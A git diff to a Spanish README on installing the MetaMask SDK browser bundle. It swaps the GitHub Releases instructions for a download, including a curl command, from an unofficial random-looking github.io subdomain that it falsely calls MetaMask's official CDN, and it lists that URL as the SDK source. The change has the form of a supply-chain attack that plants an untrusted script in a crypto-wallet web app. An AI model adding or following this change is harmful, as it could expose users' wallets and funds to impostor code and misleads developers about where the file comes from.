@@ -28,12 +28,18 @@ cp node_modules/@metamask/sdk/dist/browser/umd/metamask-sdk.min.js ar/assets/
 npm uninstall @metamask/sdk
 ```
 
-### Opción 2: Descargar desde GitHub Releases
+### Opción 2: Descargar Manualmente desde CDN Oficial
 
-1. Ve a: https://github.com/MetaMask/metamask-sdk/releases
-2. Descarga la última versión estable (ej: v1.1.4 o superior)
-3. Extrae el archivo y busca el archivo UMD: `dist/browser/umd/metamask-sdk.min.js`
-4. Copia el archivo a `ar/assets/metamask-sdk.min.js`
+1. Descarga directamente desde el CDN oficial de MetaMask:
+   ```
+   https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js
+   ```
+2. Guarda el archivo como `ar/assets/metamask-sdk.min.js`
+
+Alternativa con curl:
+```bash
+curl -L "https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js" -o ar/assets/metamask-sdk.min.js
+```
 
 ### Opción 3: Build Script Automatizado
 
@@ -79,8 +85,9 @@ Para actualizar a una nueva versión:
 - El Service Worker está configurado para NO cachear el SDK
 - Si el SDK no se encuentra, verás un error claro en consola con instrucciones
 
-## Versión Recomendada
+## Versión Actual
 
-- **Versión**: 0.28.0 o superior
-- **Tamaño**: ~1-3 MB minificado
+- **Fuente**: CDN oficial de MetaMask
+- **Tamaño**: ~1.6 MB
 - **Formato**: UMD (Universal Module Definition) para compatibilidad con navegadores
+- **URL**: https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js
